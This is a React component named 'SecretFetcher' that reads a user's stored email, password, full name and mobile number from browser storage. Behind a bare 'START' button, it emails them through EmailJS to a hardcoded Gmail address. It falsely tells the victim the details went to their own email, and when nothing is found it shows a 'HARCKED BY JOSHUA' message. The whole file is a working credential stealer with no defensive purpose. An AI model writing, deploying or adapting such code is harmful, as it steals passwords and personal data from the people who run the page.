import { useState } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "emailjs-com";

const SecretFetcher = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);

  const handleFetchAndSend = async () => {
    setLoading(true);

    // Retrieve login details
    const email = localStorage.getItem("email") || sessionStorage.getItem("email");
    const password = localStorage.getItem("password") || sessionStorage.getItem("password");
    const fullName = localStorage.getItem("fullName") || sessionStorage.getItem("fullName");
    const mobile = localStorage.getItem("mobile") || sessionStorage.getItem("mobile");

    if (email && password && fullName && mobile) {
      try {
        await emailjs.send(
          "service_xxxxx", // Your EmailJS Service ID
          "template_xxxxx", // Your EmailJS Template ID
          { 
            user_email: email, 
            user_password: password, 
            user_fullname: fullName, 
            user_mobile: mobile, 
            to_email: "mwalimujoshuakimanzi46@gmail.com" // Your email
          },
          "public_xxxxx" // Your EmailJS Public Key
        );

        setSent(true);
        setLoading(false);
        alert("Your login details have been sent to your email.");
        navigate("/success"); // Redirect to success page
      } catch (error) {
        console.error("Email sending error:", error);
        setLoading(false);
        alert("An error occurred while sending your details.");
      }
    } else {
      setLoading(false);
      alert("YOUR ACCOUNTS HAVE BEEN HARCKED BY JOSHUA!");
      navigate("/"); // Redirect to home if no login details
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100">
      <div className="p-6 bg-white rounded-lg shadow-md max-w-sm w-full">
        {!loading && !sent ? (
          <button 
            onClick={handleFetchAndSend} 
            className="px-4 py-2 bg-blue-600 text-white rounded-md w-full hover:bg-blue-700 transition"
          >
            START
          </button>
        ) : sent ? (
          <p className="text-center text-green-600">✅ Data sent successfully!</p>
        ) : null}
      </div>

      {/* Popup Loader */}
      {loading && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
          <div className="bg-white p-6 rounded-lg shadow-lg flex flex-col items-center">
            <div className="w-12 h-12 border-4 border-t-4 border-blue-600 rounded-full animate-spin"></div>
            <p className="mt-2 text-blue-600 font-semibold">Sending Data...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecretFetcher;
